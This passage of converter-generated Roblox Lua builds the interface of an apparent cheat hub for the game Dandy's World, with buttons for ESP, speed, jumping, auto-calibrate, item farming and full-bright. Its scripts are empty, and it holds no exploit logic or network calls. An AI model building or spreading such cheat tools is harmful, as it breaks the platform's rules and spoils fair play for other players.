-- StarterGui.DebugVersion.Title.script_content.options.TextButton
G2L["35"] = Instance.new("TextButton", G2L["34"]);
G2L["35"]["TextWrapped"] = true;
G2L["35"]["TextScaled"] = true;
G2L["35"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["35"]["TextSize"] = 14;
G2L["35"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["35"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["Size"] = UDim2.new(0, 345, 0, 24);
G2L["35"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["35"]["Text"] = [[Change Title Bar Color]];
G2L["35"]["Position"] = UDim2.new(0.026455026119947433, 0, 0.5390836596488953, 0);

-- StarterGui.DebugVersion.Title.script_content.options.TextButton.LocalScript
G2L["36"] = Instance.new("LocalScript", G2L["35"]);


-- StarterGui.DebugVersion.Title.script_content.options.TextButton
G2L["37"] = Instance.new("TextButton", G2L["34"]);
G2L["37"]["TextWrapped"] = true;
G2L["37"]["TextScaled"] = true;
G2L["37"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["37"]["TextSize"] = 14;
G2L["37"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["37"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["Size"] = UDim2.new(0, 345, 0, 24);
G2L["37"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["37"]["Text"] = [[Change Pages Bar Color]];
G2L["37"]["Position"] = UDim2.new(0.026455026119947433, 0, 0.6253370046615601, 0);

-- StarterGui.DebugVersion.Title.script_content.options.TextButton.LocalScript
G2L["38"] = Instance.new("LocalScript", G2L["37"]);


-- StarterGui.DebugVersion.Title.script_content.options.TextButton
G2L["39"] = Instance.new("TextButton", G2L["34"]);
G2L["39"]["TextWrapped"] = true;
G2L["39"]["TextScaled"] = true;
G2L["39"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["39"]["TextSize"] = 14;
G2L["39"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["39"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39"]["Size"] = UDim2.new(0, 345, 0, 24);
G2L["39"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["39"]["Text"] = [[Change All Pages Color]];
G2L["39"]["Position"] = UDim2.new(0.026455026119947433, 0, 0.7061995267868042, 0);

-- StarterGui.DebugVersion.Title.script_content.options.TextButton.LocalScript
G2L["3a"] = Instance.new("LocalScript", G2L["39"]);


-- StarterGui.DebugVersion.Title.script_content.options.debug
G2L["3b"] = Instance.new("TextButton", G2L["34"]);
G2L["3b"]["TextWrapped"] = true;
G2L["3b"]["TextScaled"] = true;
G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["TextSize"] = 14;
G2L["3b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b"]["Size"] = UDim2.new(0, 345, 0, 24);
G2L["3b"]["Name"] = [[debug]];
G2L["3b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b"]["Text"] = [[Activate Debug Mode (press F9 to see all)]];
G2L["3b"]["Position"] = UDim2.new(0.026455026119947433, 0, 0.7951484322547913, 0);

-- StarterGui.DebugVersion.Title.script_content.options.debug.LocalScript
G2L["3c"] = Instance.new("LocalScript", G2L["3b"]);


-- StarterGui.DebugVersion.Title.script_content.options.TextBox
G2L["3d"] = Instance.new("TextBox", G2L["34"]);
G2L["3d"]["BorderSizePixel"] = 0;
G2L["3d"]["TextSize"] = 14;
G2L["3d"]["TextWrapped"] = true;
G2L["3d"]["TextScaled"] = true;
G2L["3d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3d"]["PlaceholderText"] = [[set  speed multiplier here...]];
G2L["3d"]["Size"] = UDim2.new(0, 343, 0, 29);
G2L["3d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d"]["Text"] = [[]];
G2L["3d"]["Position"] = UDim2.new(0.0317460335791111, 0, 0.8921833038330078, 0);

-- StarterGui.DebugVersion.Title.script_content.options.Frame
G2L["3e"] = Instance.new("Frame", G2L["34"]);
G2L["3e"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3e"]["Size"] = UDim2.new(0, 336, 0, 165);
G2L["3e"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3e"]["Position"] = UDim2.new(0.0317460335791111, 0, 0.03504043072462082, 0);

-- StarterGui.DebugVersion.Title.script_content.options.Frame.TextLabel
G2L["3f"] = Instance.new("TextLabel", G2L["3e"]);
G2L["3f"]["BorderSizePixel"] = 0;
G2L["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3f"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f"]["TextSize"] = 14;
G2L["3f"]["TextColor3"] = Color3.fromRGB(255, 0, 5);
G2L["3f"]["Size"] = UDim2.new(0, 105, 0, 20);
G2L["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3f"]["Text"] = [[Dandys World Hub I Made By G0bbyD0llan57 on YT]];
G2L["3f"]["BackgroundTransparency"] = 0.9990000128746033;
G2L["3f"]["Position"] = UDim2.new(0.3422619104385376, 0, 0.036363635212183, 0);

-- StarterGui.DebugVersion.Title.script_content.options.Frame.TextButton
G2L["40"] = Instance.new("TextButton", G2L["3e"]);
G2L["40"]["TextWrapped"] = true;
G2L["40"]["BorderSizePixel"] = 2;
G2L["40"]["TextScaled"] = true;
G2L["40"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["40"]["TextSize"] = 14;
G2L["40"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["40"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["40"]["Size"] = UDim2.new(0, 264, 0, 19);
G2L["40"]["BorderColor3"] = Color3.fromRGB(82, 255, 0);
G2L["40"]["Text"] = [[copy video link]];
G2L["40"]["Position"] = UDim2.new(0.1190476194024086, 0, 0.2242424190044403, 0);

-- StarterGui.DebugVersion.Title.script_content.options.Frame.TextButton.LocalScript
G2L["41"] = Instance.new("LocalScript", G2L["40"]);


-- StarterGui.DebugVersion.Title.script_content.options.Frame.TextButton
G2L["42"] = Instance.new("TextButton", G2L["3e"]);
G2L["42"]["TextWrapped"] = true;
G2L["42"]["BorderSizePixel"] = 2;
G2L["42"]["TextScaled"] = true;
G2L["42"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["42"]["TextSize"] = 14;
G2L["42"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["42"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["42"]["Size"] = UDim2.new(0, 264, 0, 19);
G2L["42"]["BorderColor3"] = Color3.fromRGB(18, 255, 0);
G2L["42"]["Text"] = [[copy youtube channel link]];
G2L["42"]["Position"] = UDim2.new(0.1190476194024086, 0, 0.39393940567970276, 0);

-- StarterGui.DebugVersion.Title.script_content.options.Frame.TextButton.LocalScript
G2L["43"] = Instance.new("LocalScript", G2L["42"]);


-- StarterGui.DebugVersion.Title.script_content.options.Frame.TextLabel
G2L["44"] = Instance.new("TextLabel", G2L["3e"]);
G2L["44"]["BorderSizePixel"] = 0;
G2L["44"]["RichText"] = true;
G2L["44"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["44"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["44"]["TextSize"] = 14;
G2L["44"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["44"]["Size"] = UDim2.new(0, 306, 0, 63);
G2L["44"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["44"]["Text"] = [[version : 1.2
--unlocked Auto-Distract
--Fixxed Bugs
All of this was made By G0bbyD0llan!]];
G2L["44"]["BackgroundTransparency"] = 0.9990000128746033;
G2L["44"]["Position"] = UDim2.new(-0.1398809552192688, 0, 0.581818163394928, 0);

-- StarterGui.DebugVersion.Title.script_content.options.Frame.ImageLabel
G2L["45"] = Instance.new("ImageLabel", G2L["3e"]);
G2L["45"]["BorderSizePixel"] = 0;
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["45"]["ImageTransparency"] = 0.6800000071525574;
G2L["45"]["Visible"] = false;
G2L["45"]["Image"] = [[http://www.roblox.com/asset/?id=119926320714906]];
G2L["45"]["Size"] = UDim2.new(0, 378, 0, 371);
G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["BackgroundTransparency"] = 0.949999988079071;
G2L["45"]["Position"] = UDim2.new(-0.0357142873108387, 0, -0.07878787815570831, 0);

-- StarterGui.DebugVersion.Title.script_content.options.Frame.ImageLabel.LocalScript
G2L["46"] = Instance.new("LocalScript", G2L["45"]);


-- StarterGui.DebugVersion.Title.script_content.options.Frame.TextButton
G2L["47"] = Instance.new("TextButton", G2L["3e"]);
G2L["47"]["TextWrapped"] = true;
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["TextScaled"] = true;
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["TextSize"] = 14;
G2L["47"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["47"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["Size"] = UDim2.new(0, 122, 0, 50);
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["Text"] = [[You won't regret pressing this button.]];
G2L["47"]["Position"] = UDim2.new(0.613095223903656, 0, 0.6181818246841431, 0);

-- StarterGui.DebugVersion.Title.script_content.options.Frame.TextButton.LocalScript
G2L["48"] = Instance.new("LocalScript", G2L["47"]);


-- StarterGui.DebugVersion.Title.script_content.Main
G2L["49"] = Instance.new("Frame", G2L["3"]);
G2L["49"]["BorderSizePixel"] = 0;
G2L["49"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["49"]["BackgroundTransparency"] = 1;
G2L["49"]["Size"] = UDim2.new(0, 378, 0, 368);
G2L["49"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["49"]["Position"] = UDim2.new(0, 0, 0.05128201097249985, 0);
G2L["49"]["Visible"] = false;
G2L["49"]["Name"] = [[Main]];

-- StarterGui.DebugVersion.Title.script_content.Main.Player
G2L["4a"] = Instance.new("TextLabel", G2L["49"]);
G2L["4a"]["TextWrapped"] = true;
G2L["4a"]["TextStrokeTransparency"] = 0;
G2L["4a"]["BorderSizePixel"] = 0;
G2L["4a"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["4a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4a"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4a"]["TextSize"] = 30;
G2L["4a"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["Size"] = UDim2.new(0, 359, 0, 30);
G2L["4a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4a"]["Text"] = [[Local Player (BE CAREFUL)]];
G2L["4a"]["Name"] = [[Player]];
G2L["4a"]["BackgroundTransparency"] = 1;
G2L["4a"]["Position"] = UDim2.new(0.024000000208616257, 0, -0.013000000268220901, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.Player.UICorner
G2L["4b"] = Instance.new("UICorner", G2L["4a"]);


-- StarterGui.DebugVersion.Title.script_content.Main.speed
G2L["4c"] = Instance.new("TextButton", G2L["49"]);
G2L["4c"]["TextWrapped"] = true;
G2L["4c"]["BorderSizePixel"] = 0;
G2L["4c"]["TextScaled"] = true;
G2L["4c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4c"]["TextSize"] = 14;
G2L["4c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4c"]["TextColor3"] = Color3.fromRGB(0, 5, 255);
G2L["4c"]["Size"] = UDim2.new(0, 97, 0, 27);
G2L["4c"]["Name"] = [[speed]];
G2L["4c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4c"]["Text"] = [[speed]];
G2L["4c"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.08152174204587936, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.speed.UIStroke
G2L["4d"] = Instance.new("UIStroke", G2L["4c"]);
G2L["4d"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["Thickness"] = 3;
G2L["4d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.speed.LocalScript
G2L["4e"] = Instance.new("LocalScript", G2L["4c"]);


-- StarterGui.DebugVersion.Title.script_content.Main.esp
G2L["4f"] = Instance.new("TextLabel", G2L["49"]);
G2L["4f"]["TextWrapped"] = true;
G2L["4f"]["TextStrokeTransparency"] = 0;
G2L["4f"]["BorderSizePixel"] = 0;
G2L["4f"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["4f"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4f"]["TextSize"] = 30;
G2L["4f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["Size"] = UDim2.new(0, 359, 0, -34);
G2L["4f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["Text"] = [[ESP]];
G2L["4f"]["Name"] = [[esp]];
G2L["4f"]["BackgroundTransparency"] = 1;
G2L["4f"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.24728260934352875, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.esp.UICorner
G2L["50"] = Instance.new("UICorner", G2L["4f"]);


-- StarterGui.DebugVersion.Title.script_content.Main.monsters
G2L["51"] = Instance.new("TextButton", G2L["49"]);
G2L["51"]["TextWrapped"] = true;
G2L["51"]["BorderSizePixel"] = 0;
G2L["51"]["TextScaled"] = true;
G2L["51"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["51"]["TextSize"] = 14;
G2L["51"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["51"]["TextColor3"] = Color3.fromRGB(0, 5, 255);
G2L["51"]["Size"] = UDim2.new(0, 97, 0, 27);
G2L["51"]["Name"] = [[monsters]];
G2L["51"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["51"]["Text"] = [[monsters]];
G2L["51"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.24728260934352875, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.monsters.UIStroke
G2L["52"] = Instance.new("UIStroke", G2L["51"]);
G2L["52"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["Thickness"] = 3;
G2L["52"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.monsters.LocalScript
G2L["53"] = Instance.new("LocalScript", G2L["51"]);


-- StarterGui.DebugVersion.Title.script_content.Main.generators
G2L["54"] = Instance.new("TextButton", G2L["49"]);
G2L["54"]["TextWrapped"] = true;
G2L["54"]["BorderSizePixel"] = 0;
G2L["54"]["TextScaled"] = true;
G2L["54"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["54"]["TextSize"] = 14;
G2L["54"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["54"]["TextColor3"] = Color3.fromRGB(0, 5, 255);
G2L["54"]["Size"] = UDim2.new(0, 97, 0, 27);
G2L["54"]["Name"] = [[generators]];
G2L["54"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["54"]["Text"] = [[generators]];
G2L["54"]["Position"] = UDim2.new(0.3174603283405304, 0, 0.24728260934352875, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.generators.UIStroke
G2L["55"] = Instance.new("UIStroke", G2L["54"]);
G2L["55"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["55"]["Thickness"] = 3;
G2L["55"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.generators.LocalScript
G2L["56"] = Instance.new("LocalScript", G2L["54"]);


-- StarterGui.DebugVersion.Title.script_content.Main.farm
G2L["57"] = Instance.new("TextLabel", G2L["49"]);
G2L["57"]["TextWrapped"] = true;
G2L["57"]["TextStrokeTransparency"] = 0;
G2L["57"]["BorderSizePixel"] = 0;
G2L["57"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["57"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["TextSize"] = 30;
G2L["57"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["Size"] = UDim2.new(0, 359, 0, -34);
G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["Text"] = [[Farm / Pick up Items]];
G2L["57"]["Name"] = [[farm]];
G2L["57"]["BackgroundTransparency"] = 1;
G2L["57"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.42934781312942505, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.farm.UICorner
G2L["58"] = Instance.new("UICorner", G2L["57"]);


-- StarterGui.DebugVersion.Title.script_content.Main.speed
G2L["59"] = Instance.new("TextButton", G2L["49"]);
G2L["59"]["TextWrapped"] = true;
G2L["59"]["BorderSizePixel"] = 0;
G2L["59"]["TextScaled"] = true;
G2L["59"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["59"]["TextSize"] = 14;
G2L["59"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["59"]["TextColor3"] = Color3.fromRGB(0, 5, 255);
G2L["59"]["Size"] = UDim2.new(0, 97, 0, 27);
G2L["59"]["Name"] = [[speed]];
G2L["59"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["59"]["Text"] = [[allow jump]];
G2L["59"]["Position"] = UDim2.new(0.3174603283405304, 0, 0.08152174204587936, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.speed.UIStroke
G2L["5a"] = Instance.new("UIStroke", G2L["59"]);
G2L["5a"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["5a"]["Thickness"] = 3;
G2L["5a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.speed.LocalScript
G2L["5b"] = Instance.new("LocalScript", G2L["59"]);


-- StarterGui.DebugVersion.Title.script_content.Main.farm
G2L["5c"] = Instance.new("TextLabel", G2L["49"]);
G2L["5c"]["TextWrapped"] = true;
G2L["5c"]["TextStrokeTransparency"] = 0;
G2L["5c"]["BorderSizePixel"] = 0;
G2L["5c"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["5c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5c"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5c"]["TextSize"] = 30;
G2L["5c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5c"]["Size"] = UDim2.new(0, 359, 0, -34);
G2L["5c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5c"]["Text"] = [[generators]];
G2L["5c"]["Name"] = [[farm]];
G2L["5c"]["BackgroundTransparency"] = 1;
G2L["5c"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.595108687877655, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.farm.UICorner
G2L["5d"] = Instance.new("UICorner", G2L["5c"]);


-- StarterGui.DebugVersion.Title.script_content.Main.Aut
G2L["5e"] = Instance.new("TextButton", G2L["49"]);
G2L["5e"]["TextWrapped"] = true;
G2L["5e"]["BorderSizePixel"] = 0;
G2L["5e"]["TextScaled"] = true;
G2L["5e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5e"]["TextSize"] = 14;
G2L["5e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5e"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["5e"]["Size"] = UDim2.new(0, 97, 0, 27);
G2L["5e"]["Name"] = [[Aut]];
G2L["5e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5e"]["Text"] = [[Auto-Calibrate]];
G2L["5e"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.6114130616188049, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.Aut.UIStroke
G2L["5f"] = Instance.new("UIStroke", G2L["5e"]);
G2L["5f"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["5f"]["Thickness"] = 3;
G2L["5f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.Aut.LocalScript
G2L["60"] = Instance.new("LocalScript", G2L["5e"]);


-- StarterGui.DebugVersion.Title.script_content.Main.monsters
G2L["61"] = Instance.new("TextButton", G2L["49"]);
G2L["61"]["TextWrapped"] = true;
G2L["61"]["BorderSizePixel"] = 0;
G2L["61"]["TextScaled"] = true;
G2L["61"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["61"]["TextSize"] = 14;
G2L["61"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["61"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["61"]["Size"] = UDim2.new(0, 97, 0, 27);
G2L["61"]["Name"] = [[monsters]];
G2L["61"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["61"]["Text"] = [[Tapes]];
G2L["61"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.42934781312942505, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.monsters.UIStroke
G2L["62"] = Instance.new("UIStroke", G2L["61"]);
G2L["62"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["62"]["Thickness"] = 3;
G2L["62"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.monsters.LocalScript
G2L["63"] = Instance.new("LocalScript", G2L["61"]);


-- StarterGui.DebugVersion.Title.script_content.Main.itemsesp
G2L["64"] = Instance.new("TextButton", G2L["49"]);
G2L["64"]["TextWrapped"] = true;
G2L["64"]["BorderSizePixel"] = 0;
G2L["64"]["TextScaled"] = true;
G2L["64"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["64"]["TextSize"] = 14;
G2L["64"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["64"]["TextColor3"] = Color3.fromRGB(0, 5, 255);
G2L["64"]["Size"] = UDim2.new(0, 97, 0, 27);
G2L["64"]["Name"] = [[itemsesp]];
G2L["64"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["64"]["Text"] = [[Items]];
G2L["64"]["Position"] = UDim2.new(0.6164020895957947, 0, 0.24728260934352875, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.itemsesp.UIStroke
G2L["65"] = Instance.new("UIStroke", G2L["64"]);
G2L["65"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["Thickness"] = 3;
G2L["65"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.itemsesp.LocalScript
G2L["66"] = Instance.new("LocalScript", G2L["64"]);


-- StarterGui.DebugVersion.Title.script_content.Main.farm
G2L["67"] = Instance.new("TextLabel", G2L["49"]);
G2L["67"]["TextWrapped"] = true;
G2L["67"]["TextStrokeTransparency"] = 0;
G2L["67"]["BorderSizePixel"] = 0;
G2L["67"]["TextYAlignment"] = Enum.TextYAlignment.Top;
G2L["67"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["67"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
G2L["67"]["TextSize"] = 30;
G2L["67"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["Size"] = UDim2.new(0, 359, 0, -34);
G2L["67"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["Text"] = [[Misc / Fun]];
G2L["67"]["Name"] = [[farm]];
G2L["67"]["BackgroundTransparency"] = 1;
G2L["67"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.7771739363670349, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.farm.UICorner
G2L["68"] = Instance.new("UICorner", G2L["67"]);


-- StarterGui.DebugVersion.Title.script_content.Main.Aut
G2L["69"] = Instance.new("TextButton", G2L["49"]);
G2L["69"]["TextWrapped"] = true;
G2L["69"]["BorderSizePixel"] = 0;
G2L["69"]["TextScaled"] = true;
G2L["69"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["69"]["TextSize"] = 14;
G2L["69"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["69"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["69"]["Size"] = UDim2.new(0, 97, 0, 27);
G2L["69"]["Name"] = [[Aut]];
G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["69"]["Text"] = [[Full-Bright]];
G2L["69"]["Position"] = UDim2.new(0.02380952425301075, 0, 0.7771739363670349, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.Aut.UIStroke
G2L["6a"] = Instance.new("UIStroke", G2L["69"]);
G2L["6a"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["Thickness"] = 3;
G2L["6a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.Aut.LocalScript
G2L["6b"] = Instance.new("LocalScript", G2L["69"]);


-- StarterGui.DebugVersion.Title.script_content.Main.monsters
G2L["6c"] = Instance.new("TextButton", G2L["49"]);
G2L["6c"]["TextWrapped"] = true;
G2L["6c"]["BorderSizePixel"] = 0;
G2L["6c"]["TextScaled"] = true;
G2L["6c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6c"]["TextSize"] = 14;
G2L["6c"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["6c"]["TextColor3"] = Color3.fromRGB(0, 0, 255);
G2L["6c"]["Size"] = UDim2.new(0, 97, 0, 27);
G2L["6c"]["Name"] = [[monsters]];
G2L["6c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6c"]["Text"] = [[Every Item]];
G2L["6c"]["Position"] = UDim2.new(0.60317462682724, 0, 0.42934781312942505, 0);

-- StarterGui.DebugVersion.Title.script_content.Main.monsters.UIStroke
G2L["6d"] = Instance.new("UIStroke", G2L["6c"]);
G2L["6d"]["Color"] = Color3.fromRGB(255, 255, 255);
G2L["6d"]["Thickness"] = 3;
G2L["6d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;

-- StarterGui.DebugVersion.Title.script_content.Main.monsters.LocalScript
G2L["6e"] = Instance.new("LocalScript", G2L["6c"]);


-- StarterGui.DebugVersion.Title.script_content.Main.Aut
G2L["6f"] = Instance.new("TextButton", G2L["49"]);
G2L["6f"]["TextWrapped"] = true;
G2L["6f"]["BorderSizePixel"] = 0;
G2L["6f"]["TextScaled"] = true;
